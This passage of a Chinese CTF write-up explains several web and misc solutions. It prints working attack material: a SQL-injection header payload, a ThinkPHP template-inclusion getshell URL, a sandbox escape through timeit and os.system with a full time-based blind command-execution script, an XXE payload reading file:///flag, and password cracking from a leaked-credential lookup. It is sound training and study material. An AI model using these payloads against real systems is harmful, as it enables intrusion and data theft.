+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;dbConn-&gt;query(<span class="hljs-string">'UPDATE '</span> . <span class="hljs-keyword">$this</span>-&gt;session_table . <span class="hljs-string">" SET ip = '"</span> . <span class="hljs-keyword">$this</span>-&gt;_ip . <span class="hljs-string">"',  data = '$data' WHERE session_id = '"</span> . <span class="hljs-keyword">$this</span>-&gt;session_id . <span class="hljs-string">"'"</span>);
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_session_id</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">$this</span>-&gt;session_id = md5(uniqid(mt_rand(), <span class="hljs-keyword">true</span>));
+
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;insert_session();
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_session_key</span><span class="hljs-params">($session_id)</span>
+    </span>{
+        <span class="hljs-keyword">static</span> $ip = <span class="hljs-string">''</span>;
+
+        <span class="hljs-keyword">if</span> ($ip == <span class="hljs-string">''</span>)
+        {
+            $ip = substr(<span class="hljs-keyword">$this</span>-&gt;_ip, <span class="hljs-number">0</span>, strrpos(<span class="hljs-keyword">$this</span>-&gt;_ip, <span class="hljs-string">'.'</span>));
+        }
+
+        <span class="hljs-keyword">return</span> sprintf(<span class="hljs-string">'%08x'</span>, crc32($ip . $session_id));
+    }
+
+    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">real_ip</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-keyword">static</span> $realip = <span class="hljs-keyword">NULL</span>;
+
+        <span class="hljs-keyword">if</span> ($realip !== <span class="hljs-keyword">NULL</span>)
+        {
+            <span class="hljs-keyword">return</span> $realip;
+        }
+
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER))
+        {
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>]))
+            {
+                $realip = $_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>];
+            }
+            <span class="hljs-keyword">elseif</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'HTTP_CLIENT_IP'</span>]))
+            {
+                $realip = $_SERVER[<span class="hljs-string">'HTTP_CLIENT_IP'</span>];
+            }
+            <span class="hljs-keyword">else</span>
+            {
+                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>]))
+                {
+                    $realip = $_SERVER[<span class="hljs-string">'REMOTE_ADDR'</span>];
+                }
+                <span class="hljs-keyword">else</span>
+                {
+                    $realip = <span class="hljs-string">'0.0.0.0'</span>;
+                }
+            }
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            $realip = <span class="hljs-string">'0.0.0.0'</span>;
+        }
+        <span class="hljs-keyword">return</span> $realip;
+    }
+
+}
+</code></pre><p>直接是用拼接的方式进行数据库语句查询操作的，但我们可控变量都是放在单引号里包裹的，所以我们首要的是如何吃掉一个单引号，注意这两行代码：</p><pre><code class="php hljs">$tmp_session_id = substr(<span class="hljs-keyword">$this</span>-&gt;session_id, <span class="hljs-number">0</span>, <span class="hljs-number">32</span>);
+<span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;gen_session_key($tmp_session_id) == substr(<span class="hljs-keyword">$this</span>-&gt;session_id, <span class="hljs-number">32</span>)){
+    <span class="hljs-keyword">$this</span>-&gt;session_id = $tmp_session_id;
+}
+</code></pre><p>这里对 <code>$this-&gt;session_id</code> 做了截取，而 <code>$this-&gt;session_id</code> 的值是可以通过 <code>$_COOKIE[$this-&gt;session_name]</code> 控制的，所以我们可以通过在 cookie 里面传入 %00 ，这样经过全局转义后，赋值给 <code>$this-&gt;session_id</code> 就成了 <code>\0</code>，然后截取32位字符串的时候就可以控制其截取出 <code>\</code> 了。在这里如果直接传入 <code>'</code> 的话，在后面进行 if 判断的时候，截取字符串剩余后面第一位就是 <code>'</code> 了，无法通过逻辑。<br>
+对于这个验证逻辑，我们来看看 <code>$this-&gt;gen_session_key()</code> 函数：</p><pre><code class="php hljs">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_session_key</span><span class="hljs-params">($session_id)</span>
+    </span>{
+        <span class="hljs-keyword">static</span> $ip = <span class="hljs-string">''</span>;
+
+        <span class="hljs-keyword">if</span> ($ip == <span class="hljs-string">''</span>)
+        {
+            $ip = substr(<span class="hljs-keyword">$this</span>-&gt;_ip, <span class="hljs-number">0</span>, strrpos(<span class="hljs-keyword">$this</span>-&gt;_ip, <span class="hljs-string">'.'</span>));
+        }
+
+        <span class="hljs-keyword">return</span> sprintf(<span class="hljs-string">'%08x'</span>, crc32($ip . $session_id));
+    }
+</code></pre><p>返回的是 16 进制的字符串，然后 ip 截取这里，我们只有控制不出现 . ，然后 $ip 就返回 false，这样返回的结果完全我们就可以控制了。于是我们构造 exp 如下：</p><pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gen_session_key</span><span class="hljs-params">($session_id)</span>
+</span>{
+    <span class="hljs-keyword">static</span> $ip = <span class="hljs-string">''</span>;
+
+    <span class="hljs-keyword">if</span> ($ip == <span class="hljs-string">''</span>)
+    {
+        $ip = substr($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>], <span class="hljs-number">0</span>, strrpos($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>], <span class="hljs-string">'.'</span>));
+    }var_dump($ip);
+    <span class="hljs-keyword">return</span> sprintf(<span class="hljs-string">'%08x'</span>, crc32($ip . $session_id));
+}
+
+<span class="hljs-keyword">echo</span> gen_session_key(<span class="hljs-string">'123456789012345678901234567890P\\'</span>);<span class="hljs-comment">//06908aa7</span>
+<span class="hljs-meta">?&gt;</span>
+</code></pre><p>再来看看注入代码：</p><pre><code class="php hljs">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">load_session</span><span class="hljs-params">()</span>
+    </span>{
+        $res = <span class="hljs-keyword">$this</span>-&gt;dbConn-&gt;query(<span class="hljs-string">'SELECT data FROM '</span> . <span class="hljs-keyword">$this</span>-&gt;session_table . <span class="hljs-string">" WHERE session_id = '"</span> . <span class="hljs-keyword">$this</span>-&gt;session_id . <span class="hljs-string">"' and ip = '"</span> . <span class="hljs-keyword">$this</span>-&gt;_ip . <span class="hljs-string">"'"</span>);
+        $session = $res-&gt;fetch_array();
+        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>($session))
+        {
+            <span class="hljs-keyword">$this</span>-&gt;insert_session();
+        }
+        <span class="hljs-keyword">else</span>
+        {
+            $GLOBALS[<span class="hljs-string">'_SESSION'</span>]  = unserialize($session[<span class="hljs-string">'data'</span>]);
+        }
+    }
+</code></pre><p>就一眼明白了，通过 xff 引入注入语句，控制 <code>$session['data']</code> 的值，最后传入：</p><pre><code>X-Forwarded-For:  union select 0x613a323a7b733a343a226e616d65223b733a353a2261646d696e223b733a353a2273636f7265223b693a3130303b7d-- -
+Cookie: SESSID=123456789012345678901234567890P%006908aa7
+</code></pre><p><img src="http://hackmd.cheery.win/uploads/upload_667cb98a51f37e27e1893987fda6f4d0.png" alt=""></p><h3 id="you-think-i-think"><a class="anchor hidden-xs" href="#you-think-i-think" title="you-think-i-think"><span class="octicon octicon-link"></span></a>You Think I Think</h3><ul>
+<li>出题思路：<br>
+主要想的考点有几个：<br>
+1、thinkphp 路由规则<br>
+2、thinkphp 模板包含：<code>$this-&gt;display($name);</code><br>
+3、thinkphp 模板中使用php代码的几种方式</li>
+</ul><p>这道题上线的时候有几个没注意的地方：<br>
+1、上线时没清缓存，使得在页面源代码直接出现的exp，有些师傅直接读到就开始打了（还好把自己传的图片删了）<br>
+2、之前以为是tp模板是默认不支持原生的php代码的，结果只是自己之前测试方式不对，导致包含出错，也导致了第三个考点根本没用上，不过也纠正了自己的误区(为师傅们打call)</p><pre><code class="php hljs"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>{
+
+	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_initialize</span><span class="hljs-params">()</span></span>{
+		<span class="hljs-keyword">if</span>(!is_login()){
+			redirect(U(<span class="hljs-string">'Home/Login/login'</span>));<span class="hljs-keyword">exit</span>();
+		}
+	}
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span>{
+        $where[<span class="hljs-string">'id'</span>] = intval(session(<span class="hljs-string">'uid'</span>));
+        $info = M(<span class="hljs-string">'users'</span>)-&gt;where($where)-&gt;find();
+
+        <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">'username'</span>, $info[<span class="hljs-string">'username'</span>]);
+        <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-string">'head_image'</span>, $info[<span class="hljs-string">'head_image'</span>]);
+
+        <span class="hljs-keyword">$this</span>-&gt;display();
+    }
+
+    <span class="hljs-comment">//修改密码</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">repass</span><span class="hljs-params">()</span></span>{
+        ! <span class="hljs-keyword">isset</span> ( $_GET [<span class="hljs-string">'temp'</span>] ) || $name = I ( <span class="hljs-string">'get.temp'</span>, <span class="hljs-string">'index'</span>, <span class="hljs-string">'addslashes,htmlspecialchars'</span>);
+        
+        <span class="hljs-keyword">if</span> (IS_POST) {
+            $login = D(<span class="hljs-string">'users'</span>);
+            <span class="hljs-keyword">if</span> (!$data = $login-&gt;create()) {
+                <span class="hljs-comment">// 防止输出中文乱码</span>
+                header(<span class="hljs-string">"Content-type: text/html; charset=utf-8"</span>);
+                <span class="hljs-keyword">$this</span>-&gt;error($login-&gt;getError());
+            }
+
+            $re_oldpass = md5(I(<span class="hljs-string">'post.oldpassword'</span>));
+
+            $where[<span class="hljs-string">'id'</span>] = intval(session(<span class="hljs-string">'uid'</span>));
+            $oldpass = M(<span class="hljs-string">'users'</span>)-&gt;where($where)-&gt;getField(<span class="hljs-string">'password'</span>);
+            
+            <span class="hljs-keyword">if</span>($re_oldpass === $oldpass){
+                $User = M(<span class="hljs-string">'users'</span>);
+                <span class="hljs-comment">//$User-&gt;password = $data;</span>
+                $User-&gt;where($where)-&gt;save($data);
+                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">'修改密码成功,正跳转至系统首页...'</span>, U(<span class="hljs-string">'Index/index'</span>));
+            }
+
+        }<span class="hljs-keyword">else</span>{
+            <span class="hljs-keyword">$this</span>-&gt;display($name);
+        }
+        
+    }
+
+    <span class="hljs-comment">//修改头像</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rehead</span><span class="hljs-params">()</span></span>{
+        ! <span class="hljs-keyword">isset</span> ( $_GET [<span class="hljs-string">'temp'</span>] ) || $name = I ( <span class="hljs-string">'get.temp'</span>, <span class="hljs-string">'index'</span>, <span class="hljs-string">'addslashes,htmlspecialchars'</span>);
+        
+        <span class="hljs-keyword">if</span> (IS_POST) {
+            <span class="hljs-keyword">if</span>(!is_dir(<span class="hljs-string">'./Upload/'</span>)){
+                @mkdir(<span class="hljs-string">'./Upload'</span>, <span class="hljs-number">0755</span>, <span class="hljs-keyword">true</span>);
+            }
+            $upload = <span class="hljs-keyword">new</span> \Think\Upload();<span class="hljs-comment">// 实例化上传类</span>
+            $upload-&gt;maxSize   =     <span class="hljs-number">3145728</span> ;<span class="hljs-comment">// 设置附件上传大小</span>
+            $upload-&gt;exts      =     <span class="hljs-keyword">array</span>(<span class="hljs-string">'jpg'</span>, <span class="hljs-string">'png'</span>, <span class="hljs-string">'jpeg'</span>);<span class="hljs-comment">// 设置附件上传类型</span>
+            $upload-&gt;rootPath  =     <span class="hljs-string">'./Upload/'</span>; <span class="hljs-comment">// 设置附件上传根目录</span>
+            $upload-&gt;savePath  =     <span class="hljs-string">''</span>; <span class="hljs-comment">// 设置附件上传（子）目录</span>
+            $upload-&gt;saveName = md5(time().mt_rand().session(uid));
+            <span class="hljs-comment">// 上传文件 </span>
+            $info   =   $upload-&gt;upload();
+            <span class="hljs-keyword">if</span>(!$info) {<span class="hljs-comment">// 上传错误提示错误信息</span>
+                <span class="hljs-keyword">$this</span>-&gt;error($upload-&gt;getError());
+            }<span class="hljs-keyword">else</span>{<span class="hljs-comment">// 上传成功</span>
+                $User = M(<span class="hljs-string">'users'</span>);
+                $data[<span class="hljs-string">'head_image'</span>] = <span class="hljs-string">"/Upload/"</span>.$info[<span class="hljs-string">'photo'</span>][<span class="hljs-string">'savepath'</span>].<span class="hljs-string">"/"</span>.$info[<span class="hljs-string">'photo'</span>][<span class="hljs-string">'savename'</span>];
+
+                $where[<span class="hljs-string">'id'</span>] = intval(session(<span class="hljs-string">'uid'</span>));
+                $User-&gt;where($where)-&gt;save($data);
+
+                <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">'上传成功！'</span>,U(<span class="hljs-string">'Index/index'</span>));
+            }
+        }<span class="hljs-keyword">else</span>{
+            <span class="hljs-keyword">$this</span>-&gt;display($name);
+        }
+        
+    }
+
+    <span class="hljs-comment">/**
+     * 用户注销
+     */</span>
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span><span class="hljs-params">()</span>
+    </span>{
+        <span class="hljs-comment">// 清楚所有session</span>
+        session(<span class="hljs-keyword">null</span>);
+        redirect(U(<span class="hljs-string">'Login/login'</span>));
+    }
+}
+</code></pre><p>可以看到，在修改密码和上传头像处，都是可以控制进入 <code>$this-&gt;display()</code>函数的变量的，黑盒测试的时候，替换原本的 url 中的参数为 <code>robots.txt</code> ,即如下 url：<br>
+<code>http://39.106.11.158/web1/index.php/home/index/repass/temp/robots.txt.html</code><br>
+即可看到包含进了 robots.txt，加上有上传图片的功能，因此很容易想到可以包含上传的图片getshell。<br>
+需要注意的点：<br>
+1、包含的时候 url 模式需要由 PATHINFO模式 改成 兼容模式，同时包含路径是相对于 index.php 文件的位置的<br>
+2、包含的图片不能过大，不然会出错，本来以为默认禁止了原生 php 代码，这次题目里就没这次禁用到，如果平时遇到禁用了的情况，是可以通过传入 &lt;php&gt;&lt;/php&gt; 这种格式来的 shell 的，具体见 :</p><p><a href="http://document.thinkphp.cn/manual_3_2.html#use_php" target="_blank">ThinkPHP3.2完全开发手册–使用原生php代码</a></p><p>最后构造的exp：</p><pre><code>http://39.106.11.158/web1/index.php?s=/home/index/repass&amp;temp=./Upload/2017-11-04//5f3d47e74b2885c4e854abe4f06cf887.png
+</code></pre><h3 id="catch-me-if-you-can"><a class="anchor hidden-xs" href="#catch-me-if-you-can" title="catch-me-if-you-can"><span class="octicon octicon-link"></span></a>catch me if you can</h3><p>这是道社工题，找线索细心些就不难做，首先是个黑页，留了个QQ号<br>
+直接放QQ里搜索，可以查到一个 <strong>sonic monkey</strong> 账户，无需加好友(<s>有些师傅加了好友尽说骚话_(:з」∠)_ ，尴尬</s>)，空间没有设权限，进入空间从一堆动态中找到一条base64编码的说说</p><p><img src="http://chuantu.biz/t6/127/1509852822x2101804615.png" alt=""></p><p>解码后</p><blockquote>
+<p>My Page    :     <a href="http://47.93.205.124:8001/" target="_blank">http://47.93.205.124:8001/</a></p>
+</blockquote><p>是一个个人主页的地址，访问是猴子的小金库，御剑扫一扫，发现后台</p><blockquote>
+<p><a href="http://47.93.205.124:8001/manage_login.php" target="_blank">http://47.93.205.124:8001/manage_login.php</a></p>
+</blockquote><p>首页文章发表者就是用户名 <strong>sonic2011</strong></p><p>右键查看源代码，发现页脚处留有邮箱 <strong><a href="mailto:sonic@163.com" target="_blank">sonic@163.com</a></strong></p><p><a href="http://163.donothackme.club" target="_blank">社工库</a>走一发</p><p>帐号密码到手</p><pre><code>用户：sonic2011
+密码：019157f2299755ad90a3bb8473f8****
+</code></pre><p>md5最后四位填充0-f任意即可，eg:<strong>019157f2299755ad90a3bb8473f81111</strong></p><p>再<a href="http://pmd5.com" target="_blank">md5解密</a>一波得密码 <strong>2010sonic</strong><br>
+登陆得到flag</p><p><img src="http://chuantu.biz/t6/127/1509854060x2101804615.png" alt=""></p><h3 id="偷懒的出题人"><a class="anchor hidden-xs" href="#偷懒的出题人" title="偷懒的出题人"><span class="octicon octicon-link"></span></a>偷懒的出题人</h3><p>出题思路： 在日常渗透中，容易遇见基于nginx的waf，利用反向代理实现类似“云waf”的效果，nginx在处理数据时，如果数据超长，就会导致不会被带入waf模块导致绕过,里面的触发题目是去年的web4，网上百度就可以找到解法了<br>
+题目解法：riji.php post传参 x=xxx(重复较多次)&amp;id=-1 union select 1,2,flag from flag</p><h3 id="python-sandbox"><a class="anchor hidden-xs" href="#python-sandbox" title="python-sandbox"><span class="octicon octicon-link"></span></a>python sandbox</h3><ul>
+<li>出题思路：这其实是一个我想做的python在线代码编辑练习的站点，因为要考虑其安全性，所以我把文件读写，网络请求和一些危险模块ban掉了，这样就形成了一个沙盒,也就出现了这道题目。</li>
+</ul><p>从师傅们的payload可以看到大多是这几种:</p><ol>
+<li><code>__builtin__</code></li>
+<li><code>[].__class__.__base__.__subclasses__()</code>魔术方法；</li>
+<li>一些危险模块等</li>
+</ol><p>还有些师傅直接以为是pwn过沙盒，-。-！！但是其实没有那么复杂啊，这是一道web题，我后面给出的tips是:内置模块,内置函数，而python的内置模块百度下或者去官方还是很容易获得一个列表的，除去我ban掉的如os,sys等危险的模块，还有很多可以尝试的啊 .</p><ul>
+<li>我这里给出的利用是来自一个常见的内置模块:timeit.我相信很多初学python的人都会用到timeit模块来获取代码的执行时间，参看其文档可以看到这样的用法可以导致任意代码执行</li>
+</ul><pre><code class="#!/usr/bin/python hljs"><span class="hljs-comment">#coding:utf-8</span>
+<span class="hljs-keyword">import</span> timeit
+timeit.timeit(<span class="hljs-string">"__import__('os').system('')"</span>, number=<span class="hljs-number">1</span>)
+</code></pre><p>还有一个模块platform,同样也可以的</p><pre><code>import platform
+platform.popen('id', mode='r', bufsize=-1).read()
+</code></pre><p>在timeit模块里利用__import__内置函数加载os模块，然后就可以任意命令执行了，但是<code>cat flag</code>是没有回显的，因为返回的是代码的执行时间.再加上这里我把发起网络请求也给ban了，所以并不能通过cloudeye等外带通道获取命令执行的结果。</p><p>于是这里就有了我以前碰到的一种特殊情况:一个没有回显不能访问外网的命令执行，怎么获取返回的结果呢？答案是:time based rce</p><p>具体详情可以参看我的blog：<a href="http://icematcha.win/?p=532" target="_blank">http://icematcha.win/?p=532</a></p><p>最后写个类似盲注的脚本跑跑就出来了：</p><pre><code class="python hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
+<span data-linenumber="2"></span>
+<span data-linenumber="3"></span>
+<span data-linenumber="4"></span>
+<span data-linenumber="5"></span>
+<span data-linenumber="6"></span>
+<span data-linenumber="7"></span>
+<span data-linenumber="8"></span>
+<span data-linenumber="9"></span>
+<span data-linenumber="10"></span>
+<span data-linenumber="11"></span>
+<span data-linenumber="12"></span>
+<span data-linenumber="13"></span>
+<span data-linenumber="14"></span>
+<span data-linenumber="15"></span>
+<span data-linenumber="16"></span>
+<span data-linenumber="17"></span>
+<span data-linenumber="18"></span>
+<span data-linenumber="19"></span>
+<span data-linenumber="20"></span>
+<span data-linenumber="21"></span>
+<span data-linenumber="22"></span>
+<span data-linenumber="23"></span>
+<span data-linenumber="24"></span>
+<span data-linenumber="25"></span>
+<span data-linenumber="26"></span>
+<span data-linenumber="27"></span>
+<span data-linenumber="28"></span>
+<span data-linenumber="29"></span>
+<span data-linenumber="30"></span>
+<span data-linenumber="31"></span>
+<span data-linenumber="32"></span>
+<span data-linenumber="33"></span>
+<span data-linenumber="34"></span>
+<span data-linenumber="35"></span>
+<span data-linenumber="36"></span>
+<span data-linenumber="37"></span>
+<span data-linenumber="38"></span>
+<span data-linenumber="39"></span>
+<span data-linenumber="40"></span>
+<span data-linenumber="41"></span>
+<span data-linenumber="42"></span>
+<span data-linenumber="43"></span>
+<span data-linenumber="44"></span>
+<span data-linenumber="45"></span>
+<span data-linenumber="46"></span>
+<span data-linenumber="47"></span>
+<span data-linenumber="48"></span>
+<span data-linenumber="49"></span>
+<span data-linenumber="50"></span>
+<span data-linenumber="51"></span>
+<span data-linenumber="52"></span>
+<span data-linenumber="53"></span>
+<span data-linenumber="54"></span>
+<span data-linenumber="55"></span>
+<span data-linenumber="56"></span>
+<span data-linenumber="57"></span>
+<span data-linenumber="58"></span>
+<span data-linenumber="59"></span>
+<span data-linenumber="60"></span>
+<span data-linenumber="61"></span>
+<span data-linenumber="62"></span>
+<span data-linenumber="63"></span>
+<span data-linenumber="64"></span>
+<span data-linenumber="65"></span>
+<span data-linenumber="66"></span></div><div class="code"><span class="hljs-comment">#coding:utf-8</span>
+<span class="hljs-comment">#author:icematcha</span>
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> base64
+
+
+payloads = <span class="hljs-string">"QWERTYUIIOPASDFGHJKLZXCVBNM1234567890="</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">request</span><span class="hljs-params">(url, data, timeout)</span>:</span>
+    <span class="hljs-keyword">try</span>:
+        res = requests.post(url, data = data, timeout = timeout)
+        <span class="hljs-keyword">return</span> res.content
+    <span class="hljs-keyword">except</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">True</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_length</span><span class="hljs-params">(url, cmd, timeout)</span>:</span>
+    length = <span class="hljs-string">''</span> 
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>):
+        value = <span class="hljs-string">'''#!/usr/bin/python
+#coding:utf-8
+import timeit
+timeit.timeit("__import__('os').system('if [ $(%s|base32|wc -c|cut -c %s) =  ];then sleep 2;fi')", number=1)
+'''</span> % (cmd, i)
+        data = {<span class="hljs-string">'process'</span>: value}
+        res = request(url, data, timeout)  
+        <span class="hljs-keyword">if</span> res:
+            llength = i
+            <span class="hljs-keyword">break</span>
+
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, llength):
+        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>):
+            value = <span class="hljs-string">'''#!/usr/bin/python
+#coding:utf-8
+import timeit
+timeit.timeit("__import__('os').system('if [ $(%s|base32|wc -c|cut -c %s) = %s ];then sleep 2;fi')", number=1)
+'''</span> % (cmd, i, _)
+            data = {<span class="hljs-string">'process'</span>: value}
+            <span class="hljs-keyword">if</span> request(url, data, timeout):
+                length += str(_)
+                <span class="hljs-keyword">print</span> length
+                <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">return</span> length
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_content</span><span class="hljs-params">(url, cmd, timeout, length)</span>:</span>
+    content = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1</span>, int(length)+<span class="hljs-number">1</span>):
+        <span class="hljs-keyword">for</span> payload <span class="hljs-keyword">in</span> payloads:
+            value = <span class="hljs-string">'''#!/usr/bin/python
+#coding:utf-8
+import timeit
+timeit.timeit("__import__('os').system('if [ $(%s|base32|cut -c %s) = %s ];then sleep 2;fi')", number=1)
+'''</span> % (cmd, i, payload)
+            data = {<span class="hljs-string">'process'</span>: value}
+            <span class="hljs-keyword">if</span> request(url, data, timeout):
+                content += payload
+                <span class="hljs-keyword">print</span> content
+                <span class="hljs-keyword">break</span>
+    <span class="hljs-keyword">return</span> content
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
+    length = get_length(<span class="hljs-string">'http://47.95.252.234/runcode'</span>,<span class="hljs-string">'cat flag'</span>, <span class="hljs-number">2.0</span>)
+    <span class="hljs-keyword">print</span> <span class="hljs-string">"## The base32 of content's length is:%s"</span> % length
+    content = get_content(<span class="hljs-string">'http://47.95.252.234/runcode'</span>, <span class="hljs-string">'cat flag'</span>, <span class="hljs-number">2.0</span>, length)
+    <span class="hljs-keyword">print</span> <span class="hljs-string">"## The base32 of content is:%s"</span> % content
+    <span class="hljs-keyword">print</span> <span class="hljs-string">"## The commend result content is:%s"</span> % base64.b32decode(content).strip()
+</div></div></code></pre><p><img src="/uploads/upload_d99eede4eec514800303e6dede084e44.png" alt=""></p><h3 id="师傅们一起来找flag"><a class="anchor hidden-xs" href="#师傅们一起来找flag" title="师傅们一起来找flag"><span class="octicon octicon-link"></span></a>师傅们一起来找flag</h3><p>出题思路：很多厂商在修xxe的时候经常直接过滤<code>&lt;!ENTITY</code>就认为安全了，其实不然可参考http://wooyun.chamd5.org/bug_detail.php?wybug_id=wooyun-2014-059783<br>
+解题思路：这道题就是在过滤了<code>&lt;!ENTITY</code>的情况下实现xxe<br>
+构造payload，xxe.dtd文件内容： <code>&lt;!ENTITY xxe SYSTEM "file:///flag"&gt;</code><br>
+<img src="/uploads/upload_dd055bc1dfb2a66c01738d03998325c8.png" alt=""></p><h2 id="pwn"><a class="anchor hidden-xs" href="#pwn" title="pwn"><span class="octicon octicon-link"></span></a>pwn</h2><h2 id="misc"><a class="anchor hidden-xs" href="#misc" title="misc"><span class="octicon octicon-link"></span></a>misc</h2><h3 id="我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s"><a class="anchor hidden-xs" href="#我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s" title="我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s"><span class="octicon octicon-link"></span></a>我有一顶可爱的小帽子想戴在你的头上，除非你坚持60s</h3><p>出题思路：这是一个签到题给师傅们熟悉一下我们提交的格式同时让师傅们开心下的<br>
+解题思路：下载jar文件直接拖入安卓分析软件中查看源码然后base64解密直接出结果<br>
+flag{DajiDali_JinwanChiji}</p><h3 id="我为祖国献代码"><a class="anchor hidden-xs" href="#我为祖国献代码" title="我为祖国献代码"><span class="octicon octicon-link"></span></a>我为祖国献代码</h3><p>出题思路：本来想的是做一段摩斯密码放进去的后来想出一个脑洞就做了这道题<br>
+解题思路：这是一道有点脑洞的题我做好被骂的准备了。。。下载MP3文件听了一下没有莫斯密码再看题目中的fl?g???知道这是一个解密的口令然后有些大佬就直接脚本跑了如果没有暴力破解的话就只能好好看题<br>
+题目中提到了两个关键程序猿的情人节第二个关键就是一生一世了咳咳脑洞有点大看密匙只有三位如果看过视频应该知道程序猿的情人节是5.22日因为522的十六进制就是1314所以这道题脑洞偏大~~~~直接解出来<br>
+发现是base64加密解密flag:<strong>flag{i_l0ve_you}</strong></p><h3 id="爆照！！！！"><a class="anchor hidden-xs" href="#爆照！！！！" title="爆照！！！！"><span class="octicon octicon-link"></span></a>爆照！！！！</h3><p>出题思路：出完脑洞我想了一下应该有一个正规的隐写所以做出了这道隐写术题目<br>
+解题思路：下载图片直接拖kali发现有隐藏文件改后缀发现是一个伪加密，查找文件头504b0304然后修改加密标志位09改为00然后将zip解压解压完成后我们看到了8个无后缀图片以及一张gif图我们愉快的排序，用stegsolve将八张图片排好序列之后就开始看图了第一张图片是winhex看到flag第二张图片扫码得到bilibili第三张图片是看属性详细信息还是base64解密silisili然后第四张图片是一个图种改后缀得到panama<br>
+最后根据提示？？？<em>???</em>???就得出flag了<br>
+flag:<strong>flag{bilibili_silisili_panama}</strong></p><h3 id="俄罗斯套娃"><a class="anchor hidden-xs" href="#俄罗斯套娃" title="俄罗斯套娃"><span class="octicon octicon-link"></span></a>俄罗斯套娃</h3><p>下载zip文件。伪加密，修改加密标志位，数据区(504b0304)加密标志位09改为00,文件目录区(504b0102)，三个文件就有三个加密标志位，都从09改为00，再次解压即可，key.txt为曼彻斯特编码，01代表0，10代表1,脚本处理下：</p><pre><code class="python hljs"><span class="hljs-comment">#!/usr/bin/env python</span>
+
+f = open(<span class="hljs-string">'key.txt'</span>,<span class="hljs-string">'r'</span>)
+f1 = open(<span class="hljs-string">'asd.txt'</span>,<span class="hljs-string">'w'</span>)
+
+<span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():
+    content = <span class="hljs-string">''</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(line),<span class="hljs-number">2</span>):
+        <span class="hljs-keyword">if</span> line[i:i+<span class="hljs-number">2</span>] == <span class="hljs-string">'10'</span>:
+            content += <span class="hljs-string">'1'</span>
+        <span class="hljs-keyword">if</span> line[i:i+<span class="hljs-number">2</span>] == <span class="hljs-string">'01'</span>:
+            content += <span class="hljs-string">'0'</span>
+    f1.write(content+<span class="hljs-string">'\n'</span>)
+
+f.close()
+f1.close()
